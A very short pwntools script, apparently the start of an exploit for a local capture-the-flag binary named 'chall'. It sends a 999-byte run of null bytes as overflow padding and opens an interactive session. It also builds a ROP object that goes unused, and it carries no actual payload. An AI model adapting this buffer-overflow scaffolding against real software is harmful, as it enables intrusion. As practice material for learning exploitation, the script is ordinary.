from pwn import *

exe = context.binary = ELF("./chall")
r = process()
offset = 999
rop = ROP(exe)
r.sendline(b"\x00" * offset)
r.interactive()